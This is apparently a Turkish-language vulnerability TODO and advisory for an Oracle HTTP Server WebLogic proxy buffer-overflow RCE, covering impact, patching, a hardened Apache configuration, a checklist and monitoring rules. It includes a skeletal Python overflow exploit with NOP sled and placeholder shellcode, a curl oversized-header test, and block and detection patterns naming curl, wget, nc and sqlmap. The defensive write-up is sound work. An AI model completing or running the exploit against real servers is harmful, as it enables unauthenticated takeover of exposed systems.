# TODO: CVE-2026-21962 — Oracle WebLogic Proxy RCE

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-21962 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Guvenlik_Yapilandirmasi/ |
| **Kaynak Arastirma** | [Arastirmalar/Ocak 2026 Güvenlik Açıkları Araştırması.md](../Arastirmalar/Ocak%202026%20G%C3%BCvenlik%20A%C3%A7%C4%B1klar%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-21962, Oracle HTTP Server ve WebLogic Server Proxy Plug-in bilesenlerinde bulunan kritik bir uzaktan kod yurutme (Remote Code Execution) zafiyetidir. CVSS skoru 10.0 ile en yuksek tehlike seviyesine sahip olan bu zafiyet, kimliksiz (unauthenticated) bir saldirganin ag uzerinden hedef sunucuda tam erisim ve rastgele kod yurutme saglamasina olanak tanimaktadir. Ocak 2026 sonunda halka acik bir exploit kodunun (PoC) sizdirilmasi, DMZ (Arindirilmis Bolge) icinde yer alan Oracle HTTP Server sunuculari icin risk seviyesini maksimize etmistir. Oracle Ocak 2026 Critical Patch Update kapsaminda yamasi yayinlanmistir ve acil uygulama gerektirmektedir.
*   **Etkilenen bilesenler:** Oracle HTTP Server (OHS), WebLogic Server Proxy Plug-in (mod_wl_ohs.so), Oracle Fusion Middleware altyapisi, DMZ'deki reverse proxy sunuculari, Oracle Traffic Director, Oracle Internet Application Server, WebLogic kullanan tum kurumsal Java uygulamalari

---

### 2. Teknik detay (nasil calisiyor)
*   Oracle HTTP Server (OHS), Apache HTTP Server tabanli bir web sunucusudur ve WebLogic Server'a gelen istekleri yonlendirmek icin WebLogic Proxy Plug-in (mod_wl_ohs) kullanmaktadir. Bu plug-in, DMZ'deki OHS ile ic aglardaki WebLogic Server arasindaki kopru gorevini gorur.
*   Zafiyet, mod_wl_ohs plug-in'inin gelen HTTP isteklerindeki belirli baslik (header) alanlarini islerken sinir kontrolu yapmadan tampon alanina kopyalamasindan kaynaklanmaktadir. Ozel hazirlanmis bir HTTP istegindeki asiri uzun veya bicim bozuk baslik degeri, yigin tabanli tampon tasmasi (stack-based buffer overflow) tetiklemektedir.
*   Saldirgan, hedef OHS sunucusuna (genellikle DMZ'de, internete acik) kimlik dogrulamasi gerekmeden ozel hazirlanmis bir HTTP istegi gondererek tampon tasmasini tetikler. Stack overflow, donus adresinin (return address) uezerine yazilmasiyla saldirganin kontrolune gecen kod akisi RCE saglar.
*   OHS, genellikle root veya oinstall kullanicisi yetkileriyle calistigIndan, basarili istismar sunucu uzerinde tam kontrol anlamina gelir. DMZ'deki sunucu ele gecirildikten sonra, saldirgan ic aglardaki WebLogic Server'lara pivot yapabilir.
*   **Neden:** Kok neden, mod_wl_ohs plug-in'indeki HTTP baslik isleyicisinin (header parser) gelen baslik degerinin uzunlugunu sabit boyutlu stack tamponuyla karsilastirmadan memcpy ile kopyalamasidir (CWE-121: Stack-based Buffer Overflow). Girdi dogrulamasi ve tampon boyutu kontrolu tamamen eksiktir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Oracle HTTP Server (OHS) — DMZ'de internete acik, WebLogic Proxy Plug-in etkin, 80/TCP veya 443/TCP uzerinden erisilebilir
*   **2. Normal durum:**
    ```
    1. Istemci, OHS sunucusuna HTTP istegi gonderir (orn. https://app.example.com/webapp/)
    2. mod_wl_ohs, istegi WebLogic Server'a yonlendirir (reverse proxy)
    3. WebLogic yaniti isler ve OHS uzerinden istemciye dondurur
    4. Tum HTTP baslik degerleri normal boyutlarda (< 8KB) islenir
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```python
    # Kavramsal PoC — Oracle HTTP Server mod_wl_ohs stack overflow
    import socket
    import struct

    target_host = "ohs.example.com"
    target_port = 443  # veya 80

    # 1. Ozel hazirlanmis HTTP istegi olustur
    # Asiri uzun "X-WebLogic-..." basligi ile stack overflow tetikle
    overflow_size = 4096  # Stack tampon boyutu asilir
    nop_sled = b"\x90" * 512
    # Shellcode: reverse shell veya bind shell (platforma gore)
    shellcode = b"\xcc" * 200  # Yer tutucu — gercek shellcode

    # 2. Return address — stack'teki NOP sled'e don
    # (gercek exploit icin ASLR bypass veya sabit adres gerekir)
    ret_addr = struct.pack("<Q", 0x7fff00001000)

    # 3. Zararli HTTP istegi
    payload = b"A" * overflow_size + ret_addr + nop_sled + shellcode
    http_request = (
        b"GET /weblogic/resource HTTP/1.1\r\n"
        b"Host: " + target_host.encode() + b"\r\n"
        b"X-WebLogic-KeepAliveTimeout: " + payload + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )

    # 4. Gonderi
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, target_port))
    sock.send(http_request)
    response = sock.recv(4096)
    # mod_wl_ohs stack overflow tetiklenir
    # Saldirganin shellcode'u OHS sureci baglaminda (root/oinstall) calisir
    ```
*   **4. Analiz:** mod_wl_ohs plug-in'i, X-WebLogic-KeepAliveTimeout (veya benzer WebLogic-specific) basliginin degerini 256-byte sabit boyutlu stack tamponuna memcpy ile kopyalar. 4096 byte uzunlugunda bir deger gonderildiginde, stack frame'in donus adresi (saved RIP/EIP) uzerine yazilir. Saldirgan, donus adresini NOP sled'e yonlendirerek shellcode'un calismasini saglar. OHS genellikle ASLR ve PIE ile derlenmis olsa da, halka acik PoC'de sabit ofset kullanildigina dair raporlar mevcuttur.
*   **5. Kanit:** Basarili istismar sonrasinda saldirgan OHS sunucusunda shell erisimi elde eder (root veya oinstall yetkileri). OHS error_log'da segmentation fault ve core dump kayitlari gorunur. Ag izlemede asiri uzun HTTP baslik degerleri tespit edilebilir. OHS sureci beklenmeyen alt surecleri (sh, bash, nc) baslatir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 10.0
*   **Saldiri Yuzeyi:** Internete acik (DMZ'deki OHS sunucusu dogrudan erisilebilir; kimlik dogrulama gerekmez)
*   **Karmasiklik:** Dusuk (halka acik PoC mevcut; ozel hazirlanmis bir HTTP istegi yeterli; kimlik dogrulama gerekmez)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Oracle Ocak 2026 Critical Patch Update'i tum OHS ve WebLogic sunucularina DERHAL uygulayin. OHS onune WAF (Web Application Firewall) yerlestirin ve asiri uzun HTTP baslik degerlerini (>4KB) engelleyen kurallar tanimlayin. Yama uygulanana kadar mod_wl_ohs plug-in'ini gecici olarak devre disi birakin ve WebLogic'e dogrudan erisimi sinirlandirin. DMZ'deki OHS sunucularina ek ag izolasyonu uygulayin.
*   **Orta vadeli:** DMZ mimarisini yeniden degerlendirin ve OHS yerine modern reverse proxy cozumlerine (NGINX, HAProxy, Envoy) gecis planlayin. IDS/IPS kurallarini WebLogic Proxy exploit payload'larina karsi guncelleyin. OHS sunuculari icin dosya butunluk izlemesi (file integrity monitoring) devreye alin. Penetrasyon testi kapsamina OHS/WebLogic proxy zincirini dahil edin.
*   **Uzun vadeli:** Oracle HTTP Server bağımlılığını azaltmak icin uygulama mimarisini konteyner tabanli (Kubernetes, Docker) dagitima gecirin. Uygulama teslim denetleyicileri (ADC) ve API Gateway cozumleri ile proxy katmanini modernize edin. Oracle CPU yamalarinin otomatik uygulanmasi icin CI/CD pipeline'ina yama otomasyon adimi ekleyin. DMZ sunucularina yonelik duzenly red team uygulamalari planilayin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```apache
# === GUVENSIZ: Oracle HTTP Server — mod_wl_ohs varsayilan yapilandirma ===
# httpd.conf / mod_wl_ohs.conf

# WebLogic Proxy Plug-in etkin — tampon tasmasi zafiyetine acik
LoadModule weblogic_module modules/mod_wl_ohs.so

<IfModule weblogic_module>
    <Location /weblogic>
        SetHandler weblogic-handler
        WebLogicHost internal-wls.example.com
        WebLogicPort 7001
        # HTTP baslik boyutu sinirlamasi YOK
        # Kimlik dogrulama YOK
        # WAF koruması YOK
    </Location>
</IfModule>

# HTTP baslik boyutu varsayilan siniri yeterli degil
# LimitRequestFieldSize yapilandirilmamis (varsayilan: 8190)
```

**Guvenli kod:**
```apache
# === GUVENLI: Oracle HTTP Server — mod_wl_ohs sertlestirme ===
# httpd.conf / mod_wl_ohs.conf

# 1. Yamali surum: Oracle Ocak 2026 CPU yamasi uygulanmis olmali
# $ORACLE_HOME/OPatch/opatch lspatches -oh $ORACLE_HOME

# 2. HTTP baslik boyutu sinirlamasi — stack overflow'u engelle
LimitRequestFieldSize 4096
LimitRequestLine 8190
LimitRequestFields 50

# 3. mod_wl_ohs guvenli yapilandirma
LoadModule weblogic_module modules/mod_wl_ohs.so

<IfModule weblogic_module>
    <Location /weblogic>
        SetHandler weblogic-handler
        WebLogicHost internal-wls.example.com
        WebLogicPort 7001

        # Guvenlik yapilandirmalari
        WLProxySSL ON
        WLProxySSLPassThrough ON
        SecureProxy ON
        ConnectTimeoutSecs 10
        ConnectRetrySecs 2
    </Location>
</IfModule>

# 4. Supheli User-Agent'lari engelle
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python-requests|sqlmap|nikto) [NC]
    RewriteRule .* - [F,L]
</IfModule>

# 5. Erisim kontrolu — yalnizca yetkili IP araliklari
<Location /weblogic>
    <RequireAll>
        Require ip 10.0.0.0/8
        Require ip 172.16.0.0/12
    </RequireAll>
</Location>
```

```bash
# Oracle CPU yamasi uygulama ve dogrulama
# 1. Yama durumunu kontrol et
$ORACLE_HOME/OPatch/opatch lspatches -oh $ORACLE_HOME

# 2. Yamali surumun kurulu oldugunu dogrula
$ORACLE_HOME/OPatch/opatch version

# 3. OHS'yi yamali yapilandirmayla yeniden baslat
$ORACLE_HOME/ohs/bin/opmnctl stopall
$ORACLE_HOME/ohs/bin/opmnctl startall

# 4. WAF kurali testi — asiri uzun baslik degerini gonder ve engellemeyi dogrula
curl -v -H "X-WebLogic-KeepAliveTimeout: $(python3 -c 'print("A"*5000)')" \
    https://ohs.example.com/weblogic/test 2>&1 | grep "HTTP/"
# Beklenen sonuc: 413 Request Entity Too Large veya 403 Forbidden
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Oracle HTTP Server ve WebLogic Proxy Plug-in kurulumlarini envanterle (surum, yama durumu)
*   [ ] DMZ'deki OHS sunucularini onceliklendirin — internete dogrudan acik olanlar en yuksek risk
*   [ ] Halka acik PoC'nin kendi altyapiniza karsi test edilip edilmedigini kontrol edin
*   [ ] WAF/IPS kurallarinin mevcut durumunu degerlendirin

**Duzeltme**
*   [ ] Oracle Ocak 2026 CPU yamasini tum OHS ve WebLogic sunucularina DERHAL uygula
*   [ ] OHS yapilandirmasinda LimitRequestFieldSize ve LimitRequestLine sinirlamalarini uygula
*   [ ] WAF kurallarini asiri uzun HTTP baslik degerlerini engelleyecek sekilde guncelle
*   [ ] DMZ'deki OHS sunucularina ek ag izolasyonu uygula
*   [ ] Supheli User-Agent ve kaynak IP'leri engelleyen erisim kontrolu kurallari tanimla
*   [ ] Yama uygulanana kadar mod_wl_ohs'yi gecici devre disi birakmayi degerlendir

**Dogrulama**
*   [ ] Kimliksiz uzaktan erisim testini yama sonrasi tekrarla
*   [ ] Halka acik PoC exploit'in engellendigini dogrula
*   [ ] WAF kurallarinin asiri uzun baslik degerlerini engelledigini test et
*   [ ] OHS sunucu loglarinda anormal HTTP baslik boyutlarini tespit eden kuralların calistigini dogrula
*   [ ] DMZ'den ic aga pivot girisiminin engellenmesini dogrula

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   OHS access_log'da asiri uzun HTTP baslik degerleri iceren istekleri izle (>4KB)
    *   OHS error_log'da segmentation fault, core dump ve mod_wl_ohs modulu hatalarin izle
    *   WAF/IPS loglarinda WebLogic Proxy exploit payload imzalarini tespit et
    *   Regex: `(?i)(X-WebLogic.*\x41{256,}|mod_wl_ohs.*segfault|stack.*smash.*detect)`
    *   Regex: `(?i)(weblogic.*proxy.*overflow|OHS.*core.*dump|mod_wl.*SIGSEGV)`
    *   Ag izlemede OHS sunucusundan ic aglara beklenmeyen baglantilari izle (pivot belirtisi)
*   **Anomali Tespiti:**
    *   OHS sunucu surecinin (httpd) beklenmeyen alt surecleri baslatmasi (sh, bash, nc, wget, curl)
    *   OHS error_log'da tekrarlayan segmentation fault kayitlari (exploit girisimleri)
    *   DMZ'deki OHS sunucusundan ic ag adreslerine (WebLogic disinda) baglanti girisimleri
    *   OHS surecinde anormal CPU/bellek tuketimi (shellcode yurutme belirtisi)
    *   Tek kaynaktan kisa surede cok sayida /weblogic/ yolu hedefli HTTP istekleri (exploit taramasi)

---

## Notlar
Halka acik PoC mevcut — acil yama gerektir. CVSS 10.0 ile en yuksek tehlike seviyesine sahiptir. DMZ sunuculari en yuksek riskli hedeflerdir cunku internete dogrudan acik ve kimlik dogrulama gerekmez. Oracle Ocak 2026 CPU kapsaminda 337 yeni guvenlik yamasi arasinda ele alinmistir. Fusion Middleware urun ailesi icinde en yuksek etkili zafiyettir. OHS/WebLogic proxy mimarisi kullanan tum kurumlarin acil yama uygulamasi ve WAF sikilastirmasi zorunludur.
